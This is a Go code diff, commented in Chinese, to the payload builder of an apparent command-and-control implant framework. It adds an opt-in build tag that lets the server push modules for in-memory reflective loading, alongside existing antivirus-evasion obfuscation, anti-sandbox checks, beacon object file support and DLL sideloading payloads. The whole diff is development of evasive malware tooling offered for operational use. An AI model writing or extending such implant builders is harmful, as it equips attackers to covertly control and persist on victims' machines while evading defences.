@@ -78,6 +78,12 @@ type BuildOptions struct {
 	// 关闭时载荷里不含任何 Beacon* 符号/字符串（实测这是 full 档案里唯一剩下的
 	// 高信号明文），需要用 BOF 时再开。
 	BofEnabled bool `json:"bof_enabled"`
+	// 内存模块按需加载（v1.4.0 S4）：**默认关闭**，开启时加 -tags execmodule。
+	//
+	// 关闭时载荷里没有 exec_module 任务处理、没有模块 ABI 结构、也没有 sha256 校验 ——
+	// 默认构建与改动前逐字节行为一致。开启后服务端可以用一次性 token 按需把模块
+	// 下发给载荷，在内存里反射加载执行（不落盘、不重建载荷即可获得新功能）。
+	ExecModule bool `json:"exec_module"`
 	// DLL 载荷（format=dll）：导出函数名（供 rundll32 调用，空 = Start）与"加载即启动"。
 	// 白加黑场景宿主不一定调用我们的导出函数，所以默认加载即启动（见 dll.go）。
 	DLLExport    string `json:"dll_export"`
@@ -580,7 +586,7 @@ func (b *Builder) compile(opts BuildOptions) ([]byte, error) {
 		return nil, fmt.Errorf("failed to obfuscate implant source: %v", err)
 	}
 
-	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan, opts.BofEnabled)
+	binary, err := b.compileGoCode(tmpDir, targetOS, arch, useGarble, transport, opts.Profile, opts.EvasionScan, opts.BofEnabled, opts.ExecModule)
 	if err != nil {
 		return nil, err
 	}
@@ -788,7 +794,11 @@ func (b *Builder) processTemplates(tmpDir string, opts BuildOptions) error {
 
 // buildTagList 汇总植入端构建需要的 Go 构建标签（空格分隔，可直接给 -tags）。
 // 单独抽成函数便于单测：标签直接决定哪些代码进入载荷（免杀相关，改错很难察觉）。
-func buildTagList(transport, profile string, evasionScan, bof bool) string {
+//
+// v1.4.0 S4 追加 execmodule：**默认关闭**，只有显式勾选才把"按需内存加载模块"的
+// 代码（exec_module_windows.go + 反射加载底座）编进载荷。默认构建因此与改动前
+// 逐字节等价（标签集合不变 → 参与编译的文件集合不变）。
+func buildTagList(transport, profile string, evasionScan, bof, execModule bool) string {
 	var tags []string
 	switch transport {
 	case "http":
@@ -809,6 +819,13 @@ func buildTagList(transport, profile string, evasionScan, bof bool) string {
 	}
 	if bof {
 		tags = append(tags, "bof")
+	}
+	if execModule {
+		// exec_module（v1.4.0 S4）：按需内存加载模块。
+		// 用**独立 tag** 而不是"跟着 profile 走"的原因：默认载荷必须与改动前逐字节
+		// 行为一致（体积也基本不变），而"能加载模块"是一个会引入反射加载器调用面的
+		// 能力 —— 想拿到它必须显式勾选，顺手得到的默认行为里不该多出这条路径。
+		tags = append(tags, "execmodule")
 	}
 	return strings.Join(tags, " ")
 }
@@ -836,12 +853,13 @@ func capabilityInput(opts *BuildOptions) features.Input {
 		Protocol:    opts.Protocol,
 		BOF:         opts.BofEnabled,
 		EvasionScan: opts.EvasionScan,
+		ExecModule:  opts.ExecModule,
 		OS:          targetOS,
 		Arch:        arch,
 	}
 }
 
-func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof bool) ([]byte, error) {
+func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, transport string, profile string, evasionScan, bof, execModule bool) ([]byte, error) {
 	// 编译期字符串混淆（免杀）改由 compile() 在注入每构建随机值之后统一调用，
 	// 确保随机 xd 基准与注入值一致。
 	// 条件编译标签（见 buildTagList）：
@@ -851,7 +869,7 @@ func (b *Builder) compileGoCode(tmpDir, targetOS, arch string, useGarble bool, t
 	//   profile=light        → light（裁剪截图/中继/注入/EDR 等重量级模块）
 	//   evasion_scan=on      → evasionscan（主动反沙箱进程检测；默认不编译，
 	//                          见 implant/gate_scan_windows.go 的说明）
-	buildTags := buildTagList(transport, profile, evasionScan, bof)
+	buildTags := buildTagList(transport, profile, evasionScan, bof, execModule)
 
 	// TLS 客户端实现文件按通道裁剪：
 	//   - 非 HTTP 构建（TCP）：transport_tls_std.go / transport_tls_utls.go
